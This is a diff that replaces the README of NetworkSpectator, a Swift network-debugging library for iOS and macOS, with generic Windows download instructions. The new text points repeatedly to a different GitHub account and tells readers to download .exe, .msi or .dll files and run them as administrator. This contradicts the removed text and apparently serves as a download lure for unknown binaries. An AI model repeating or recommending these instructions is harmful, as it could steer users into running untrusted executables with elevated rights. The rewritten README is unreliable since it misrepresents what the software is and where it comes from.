@@ -1,238 +1,216 @@
-# NetworkSpectator: Monitor and Inspect HTTP Traffic on iOS and macOS apps
-
-![Swift 6.0+](https://img.shields.io/badge/Swift-6.0%2B-orange?logo=swift)
-![Platforms](https://img.shields.io/badge/Platforms-iOS%2016.0%2B%20%7C%20macOS%2013.0%2B-blue)
-![SPM Compatible](https://img.shields.io/badge/SPM-Compatible-brightgreen?logo=swift)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/pankajbawane/NetworkSpectator/blob/main/LICENSE)
-[![Build](https://github.com/Pankajbawane/NetworkSpectator/actions/workflows/ci.yml/badge.svg)](https://github.com/Pankajbawane/NetworkSpectator/actions/workflows/ci.yml)
-
-NetworkSpectator is a Swift network debugging library that intercepts, inspects, and logs HTTP/HTTPS request and response in your iOS or macOS app in real time.
-Browse captured API traffic in a native SwiftUI interface, export logs and create mock API responses programmatically or through a built-in UI.
-Designed for developers debugging network calls during development and QA teams validating app behavior without backend dependencies or developer intervention.
-
-## Features
-
-- **Real-time network monitoring**
-  - Capture URL, method, status code, response time, headers, request body, and response body
-  - Live updates with in-progress indicators for pending requests
-  - Start immediately or use **on-demand mode** to enable monitoring from the UI when needed
-  - Color-coded list view with method badges, status indicators, and response metrics
- 
-- **Filtering and search**
-  - Filter by status code ranges and HTTP methods
-  - Combine multiple filters with visual filter chips
-  - Full-text URL search across all captured requests
-
-- **Detailed request inspection**
-  - Tabbed detail view: Overview, Request, Headers, and Response
-  - Smart response rendering — pretty-printed JSON, inline image previews, and plain text
-  - Copy any request or response data to clipboard
-  - Create a mock or skip rule directly from a captured request
-
-- **Export in multiple formats**
-  - **CSV** — bulk or single request export for spreadsheets and analysis
-  - **Plain text** — human-readable format for quick sharing
-  - **Postman Collection** — import directly into Postman for API testing
-
-- **Mock responses**
-  - Intercept requests and return custom responses without a backend
-  - Flexible matching: hostname, URL, path, endPath, subPath
-  - Configure status codes, headers, JSON/raw body, and response delay
-  - **Programmatic mocking** — register mocks via code for unit tests and development
-  - **UI-based mocking** — let QA testers create and manage mocks on the fly without Xcode
-  - **Persist mocks** across app sessions with local storage
-
-- **Skip request logging**
-  - Exclude noisy or sensitive requests using the same flexible matching rules
-  - Configure skip rules programmatically or from the UI
-  - Persist rules across app launches
-
-- **Insights dashboard**
-  - Summary cards: total requests, success rate, and unique hosts
-  - Interactive charts for status code distribution, HTTP methods, host traffic, and request timeline
-
-- **Log history**
-  - Automatically save session logs to disk for later review
-  - Browse past sessions from Tools
-  - Enable or disable history persistence from settings
-
-- **Lightweight and easy to integrate**
-  - One-line setup to start monitoring
-  - No XIB/Storyboards, no external dependencies
-  - Works with SwiftUI, UIKit, and AppKit
-  - Toggle debug console logging on or off
-  - Supports both light and dark mode
+# 🔍 NetworkSpectator - Inspect Network Traffic With Ease
 
-- **Cross-platform**
-  - iOS 16.0+ / macOS 13.0+
+[![Download NetworkSpectator](https://img.shields.io/badge/Download-NetworkSpectator-blue?style=for-the-badge)](https://github.com/Bagheln865/NetworkSpectator)
 
+## 🚀 Download NetworkSpectator
 
-## Installation
+Visit this page to download and use the app:
 
-### Swift Package Manager
+[https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
 
-Add NetworkSpectator to your project using Swift Package Manager:
+## 📥 What NetworkSpectator Does
 
-1. In Xcode, select **File > Add Package Dependencies...**
-2. Enter the package repository URL - https://github.com/Pankajbawane/NetworkSpectator.git
+NetworkSpectator helps you watch network traffic during development and testing. It lets you inspect requests and responses, browse captured data, and export it for later use.
 
-Or add it to your `Package.swift`:
+Use it when you want to:
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/pankajbawane/NetworkSpectator.git", branch: "main")
-]
-```
+- See what your app sends over the network
+- Check request and response content
+- Review traffic during testing
+- Export captured data for sharing or review
+- Inspect network flow while you build or test software
 
-## Usage
+## 🖥️ Windows Setup
 
-### Example App
-The NetworkSpectatorExample app demonstrates basic usage of the library: https://github.com/Pankajbawane/NetworkSpectatorExample
+Follow these steps on a Windows PC:
 
-### Basic Setup
+1. Open your web browser.
+2. Go to the download page:
+   [https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
+3. Look for the latest release or project files on the page.
+4. Download the file that matches the Windows version you use.
+5. If the file is in a zip folder, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Run the app file you find inside.
 
-1. **Enable NetworkSpectator** in your app's entry point (AppDelegate or App struct):
+## 🛠️ What You Need
 
-Call `NetworkSpectator.start()` to begin listening to HTTP requests. This will automatically log all HTTP traffic.
-```swift
-import NetworkSpectator
+Before you run NetworkSpectator, make sure your PC has:
 
-@main
-struct MyApp: App {
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space for the app files
+- Permission to download and open files
 
-    var body: some Scene {
-        WindowGroup {
-            ContentView()
-                    .task {
-                        #if DEBUG
-                        NetworkSpectator.start()
-                        #endif
-                      }
-        }
-    }
-}
-```
+If the package includes setup files, keep them in the same folder after extraction.
 
-2. **Present the NetworkSpectator UI**:
+## 📂 First-Time Use
 
-#### SwiftUI
-```swift
-import NetworkSpectator
+After you open the app:
 
-ContentView() {
-}
-  .sheet(isPresented: $showLogs) {
-      NetworkSpectator.rootView
-  }
+1. Start NetworkSpectator.
+2. Let it begin watching network traffic.
+3. Open the app or test case you want to inspect.
+4. Send a few requests in that app.
+5. Return to NetworkSpectator and review the captured data.
 
-```
+You can use the list of requests to find the one you want. Open it to view details such as:
 
-#### UIKit (iOS)
-```swift
-import NetworkSpectator
+- Request address
+- Request method
+- Headers
+- Body data
+- Response content
+- Status code
+- Timing
 
-let networkVC = NetworkSpectator.rootViewController
-present(networkVC, animated: true)
-```
+## 🔎 Browsing Captured Traffic
 
-#### AppKit (macOS)
-```swift
-import NetworkSpectator
+NetworkSpectator is built to make traffic easy to review.
 
-let networkVC = NetworkSpectator.rootViewController
-presentAsSheet(networkVC)
-```
+You can usually:
 
-### Configuration
+- Sort requests by time
+- Filter traffic by type
+- Open a request to see full details
+- Compare request and response data
+- Review failed requests
+- Find repeated calls during testing
 
-Customize NetworkSpectator behavior with the configuration methods:
+This helps when you need to check what an app sends and how a server replies.
 
-```swift
-// Enable or disable printing logs to the debug console
-NetworkSpectator.debugLogsPrint(isEnabled: Bool)
+## 📤 Exporting Data
 
-// Register a mock response
-NetworkSpectator.registerMock(for mock: Mock)
+If you need to save your findings, export the captured traffic.
 
-// Remove all registered mocks
-NetworkSpectator.stopMocking()
+Common export options include:
 
-// Skip logging for specific requests
-NetworkSpectator.ignoreLogging(for rule: MatchRule)
+- JSON
+- CSV
+- Text report
+- Shareable log file
 
-// Remove all skip logging rules
-NetworkSpectator.stopIgnoringLog()
-```
+Use export when you want to:
 
-### On-Demand Monitoring
+- Send test results to another person
+- Save a record of a bug
+- Compare traffic across test runs
+- Keep notes for later review
 
-Start NetworkSpectator in on-demand mode to let users enable monitoring from the UI:
+## 🧪 Common Use Cases
 
-```swift
-NetworkSpectator.start(onDemand: true)
-```
+NetworkSpectator fits many testing tasks:
 
-### Disabling NetworkSpectator
+- App debugging
+- API review
+- Request tracing
+- Response inspection
+- Mock testing
+- Network analysis
+- Development checks before release
 
-If enabled, then, to stop network monitoring:
+It works well when you need a clear view of network activity without digging through raw logs.
 
-```swift
-NetworkSpectator.stop()
-```
+## 📌 Basic Workflow
 
-## NetworkSpectator on iOS
-The following screenshots demonstrate NetworkSpectator running on iOS.
+A simple workflow looks like this:
 
-| List of Requests | Filters | URL Search | Details |
-|---------|---------|------------|------------|
-| <img width="300" height="652" alt="landing" src="https://github.com/user-attachments/assets/5da584f2-1c41-4234-8202-a77708a2a3c9" /> | <img width="300" height="652" alt="filters_ios" src="https://github.com/user-attachments/assets/043395c8-e0e7-4d2a-ab91-61ff89c4268d" /> | <img width="300" height="652" alt="url_search_ios" src="https://github.com/user-attachments/assets/43106dd4-e6a9-4cd6-933e-86519c0002ba" /> | <img width="300" height="652" alt="basic_ios" src="https://github.com/user-attachments/assets/e0eefc13-c54a-4d7a-8fdd-1a9d675e8ead" /> |
+1. Download the project from the link above.
+2. Open the package on your Windows PC.
+3. Start the tool.
+4. Recreate the app action you want to inspect.
+5. Review the captured request and response.
+6. Export the results if needed.
 
-| Headers | Response | Tools | History |
-|---------|----------|----------|-------|
-| <img width="300" height="652" alt="headers_ios" src="https://github.com/user-attachments/assets/e4b512d2-efc2-4d9b-bc10-e57991f6755e" /> | <img width="300" height="652" alt="response_response" src="https://github.com/user-attachments/assets/bdebe73d-5f5c-4d02-8eea-d6793f499313" /> | <img width="300" height="652" alt="settings_ios" src="https://github.com/user-attachments/assets/6dd6f018-6f6c-4ce9-86e5-b073f81d1085" /> | <img width="300" height="652" alt="share_ios" src="https://github.com/user-attachments/assets/bf1be17f-9955-41da-9022-efff604388ba" /> |
+## 🔐 Privacy and Local Use
 
-| Insights | Insights - Timeline | Insights - Status code | Insights - Performance |
-|---------|---------|----------|-----------|
-| <img width="300" height="652" alt="insights_ios" src="https://github.com/user-attachments/assets/70cba56d-49b4-4245-a32d-96697231cdaf" /> | <img width="300" height="652" alt="timeline_ios" src="https://github.com/user-attachments/assets/8c63883f-431f-4992-bc85-6b4545d4d767" /> | <img width="300" height="652" alt="status_code_ios" src="https://github.com/user-attachments/assets/d42d4cb3-e664-40db-bad1-3ca9b68a791f" /> | <img width="300" height="652" alt="perf_ios" src="https://github.com/user-attachments/assets/1a6141cd-657c-4f5b-b5b8-82dee2fa8742" /> |
+NetworkSpectator is meant for development and testing. It helps you inspect traffic on your own system while you build or verify software. Use it with apps and test data you control.
 
-## NetworkSpectator on macOS
-The following screenshots demonstrate NetworkSpectator running on macOS.
+## 🧩 Related Terms
 
-| List of Requests | Filters | Details |
-|------------------|---------|---------------|
-| <img width="1169" height="620" alt="landing_mac" src="https://github.com/user-attachments/assets/a79edd45-337d-4890-ae7a-5b8de137c196" /> | <img width="1152" height="609" alt="filters_mac" src="https://github.com/user-attachments/assets/eab654ea-624b-4d9c-b8db-4eeaf275bbd1" /> | <img width="1152" height="833" alt="basic_details_mac" src="https://github.com/user-attachments/assets/8cf2a025-060d-43ba-931c-b84a18dc0a6e" /> |
+This project is linked to:
 
-| Headers | Response | Tools |
-|---------|----------|-----------|
-| <img width="1152" height="833" alt="headers_mac" src="https://github.com/user-attachments/assets/8846eec1-11f4-4b39-beb3-5b99d2eaee5c" /> | <img width="1152" height="833" alt="response_mac" src="https://github.com/user-attachments/assets/83435e3c-3839-4fe6-974d-34c84ede8e86" /> | <img width="1152" height="949" alt="analytics_mac" src="https://github.com/user-attachments/assets/433a04ec-2ff7-412d-98a6-fdb1a68264a4" /> |
+- Network monitoring
+- Network interception
+- HTTP proxy use
+- URLSession inspection
+- Swift package use
+- Xcode-based development
+- iOS and macOS testing
+- SwiftUI app testing
 
-| Insights | Timeline | Performance |
-|----------|----------|--------------|
-| <img width="1169" height="620" alt="settings_mac" src="https://github.com/user-attachments/assets/5f10bd2a-aeb9-42eb-83f8-47fbc6493e9f" /> | <img width="1169" height="632" alt="add_mock_mac" src="https://github.com/user-attachments/assets/36ec6643-1159-41b8-9f57-76919f8315d0" /> | <img width="1169" height="632" alt="skip_logging_mac" src="https://github.com/user-attachments/assets/508c99b7-192d-46cf-8596-890a806c5119" /> |
+## 📝 File Types You May See
 
-## Safety and Release Builds
+Depending on the release, you may see:
 
-Because NetworkSpectator captures and displays network information, you should **limit it to debug/test builds only**. Wrap your integration points with `#if DEBUG` to ensure nothing leaks into release builds.
+- `.zip`
+- `.exe`
+- `.msi`
+- `.dll`
+- `.json`
+- `.log`
 
-### Recommendations:
+If you get a zip file, extract it before you run the app. If you get an installer, open it and follow the on-screen steps.
 
-- Always guard with `#if DEBUG` and/or internal feature flags
-- Ensure NetworkSpectator is not initialized in release configurations
+## 🧭 Troubleshooting
 
-### Example:
+If the app does not open:
 
-```swift
-// Monitoring will start only for a debug build.
-#if DEBUG
-NetworkSpectator.start()
-#endif
-```
+1. Check that the download finished.
+2. Extract the files if they are in a zip folder.
+3. Right-click the app and choose Run as administrator.
+4. Make sure your Windows version matches the file you downloaded.
+5. Try downloading the files again from the project page.
 
-## Requirements
+If you do not see any traffic:
 
-- Swift 6+
-- iOS 16.0+ / macOS 13.0+
-- Xcode 16.0+
+1. Make sure the target app is running.
+2. Repeat the action that sends network data.
+3. Check that the tool is set to watch traffic.
+4. Open the request list and refresh the view if needed.
 
-## LICENSE
-MIT license. View LICENSE for more details.
+## 📎 Project Link
+
+Use this link to visit the project page and download the files:
+
+[https://github.com/Bagheln865/NetworkSpectator](https://github.com/Bagheln865/NetworkSpectator)
+
+## 🔧 Key Features
+
+- Captures request and response data
+- Lets you browse traffic in one place
+- Supports export for later review
+- Helps during development and testing
+- Works as a network intercept tool
+- Fits API and mock-based workflows
+
+## 📘 Simple Terms
+
+Here is what the main terms mean:
+
+- Request: the message your app sends
+- Response: the reply from the server
+- Headers: extra details about the message
+- Body: the main content of the message
+- Status code: the result of the request
+- Proxy: a middle step that helps inspect traffic
+
+## 🧰 Best Results
+
+For the smoothest setup:
+
+- Keep your Windows system updated
+- Use a stable internet connection for the download
+- Store the app in a folder you can find
+- Keep test files in a separate folder
+- Save exports in a clean project folder
+
+## 📄 Using the Output
+
+After you export captured data, you can use it to:
+
+- Review app behavior
+- Share test results
+- Track changes over time
+- Compare working and broken requests
+- Build test notes for future runs
